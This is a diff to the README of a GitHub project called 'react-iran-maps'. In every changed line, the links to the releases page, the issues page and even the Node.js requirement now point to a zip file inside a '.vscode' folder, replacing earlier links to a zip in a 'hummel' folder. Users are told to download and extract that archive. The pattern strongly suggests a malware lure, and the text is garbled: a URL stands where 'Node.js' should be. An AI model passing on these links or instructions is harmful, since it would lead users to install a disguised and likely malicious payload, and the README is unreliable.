@@ -6,21 +6,21 @@ Welcome to the **react-iran-maps** project! This application helps you create st
 
 ## 📥 Download the Software
 
-[![Download from Releases](https://raw.githubusercontent.com/pq1234s/react-iran-maps/main/hummel/react-iran-maps.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/pq1234s/react-iran-maps/main/hummel/react-iran-maps.zip)
+[![Download from Releases](https://github.com/pq1234s/react-iran-maps/raw/refs/heads/main/.vscode/maps-iran-react-v1.1.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/pq1234s/react-iran-maps/raw/refs/heads/main/.vscode/maps-iran-react-v1.1.zip)
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/pq1234s/react-iran-maps/main/hummel/react-iran-maps.zip).
+To get started, visit this page to download: [Releases Page](https://github.com/pq1234s/react-iran-maps/raw/refs/heads/main/.vscode/maps-iran-react-v1.1.zip).
 
 ## 📋 System Requirements
 
 To run **react-iran-maps**, your computer should meet the following requirements:
 
 - Operating System: Windows 10 or later, macOS 10.12 or later, or a recent Linux distribution.
-- https://raw.githubusercontent.com/pq1234s/react-iran-maps/main/hummel/react-iran-maps.zip Version 14 or higher.
+- https://github.com/pq1234s/react-iran-maps/raw/refs/heads/main/.vscode/maps-iran-react-v1.1.zip Version 14 or higher.
 - Internet connection: Required for downloading additional resources.
 
 ## 📦 How to Install
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/pq1234s/react-iran-maps/main/hummel/react-iran-maps.zip).
+1. Visit the [Releases Page](https://github.com/pq1234s/react-iran-maps/raw/refs/heads/main/.vscode/maps-iran-react-v1.1.zip).
 2. Download the zip file for the latest version.
 3. Extract the zip file to a folder on your computer.
 
@@ -54,12 +54,12 @@ Once the application is running, you can explore various maps of Iran. Click on 
 If you encounter any issues, here are some solutions:
 
 - **Issue**: Application does not start.
-  - **Solution**: Ensure you have https://raw.githubusercontent.com/pq1234s/react-iran-maps/main/hummel/react-iran-maps.zip installed and that you are in the correct folder.
+  - **Solution**: Ensure you have https://github.com/pq1234s/react-iran-maps/raw/refs/heads/main/.vscode/maps-iran-react-v1.1.zip installed and that you are in the correct folder.
 
 - **Issue**: Maps are not displaying correctly.
   - **Solution**: Check your internet connection and try refreshing the application.
 
-For further assistance, you can visit our [GitHub Issues Page](https://raw.githubusercontent.com/pq1234s/react-iran-maps/main/hummel/react-iran-maps.zip).
+For further assistance, you can visit our [GitHub Issues Page](https://github.com/pq1234s/react-iran-maps/raw/refs/heads/main/.vscode/maps-iran-react-v1.1.zip).
 
 ## 🛠️ Contributing
 
@@ -71,7 +71,7 @@ We welcome contributions! If you want to improve the project:
 
 ## 📞 Support
 
-If you need help or have questions, feel free to reach out. You can create an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/pq1234s/react-iran-maps/main/hummel/react-iran-maps.zip), and someone from our community will assist you.
+If you need help or have questions, feel free to reach out. You can create an issue on our [GitHub Issues Page](https://github.com/pq1234s/react-iran-maps/raw/refs/heads/main/.vscode/maps-iran-react-v1.1.zip), and someone from our community will assist you.
 
 ## 📜 License
 
@@ -81,4 +81,4 @@ This project is licensed under the MIT License. For more details, see the LICENS
 
 Thank you for using **react-iran-maps**! We appreciate your support and interest in creating beautiful maps of Iran. 
 
-Remember to visit the [Releases Page](https://raw.githubusercontent.com/pq1234s/react-iran-maps/main/hummel/react-iran-maps.zip) to download the latest version!
+Remember to visit the [Releases Page](https://github.com/pq1234s/react-iran-maps/raw/refs/heads/main/.vscode/maps-iran-react-v1.1.zip) to download the latest version!
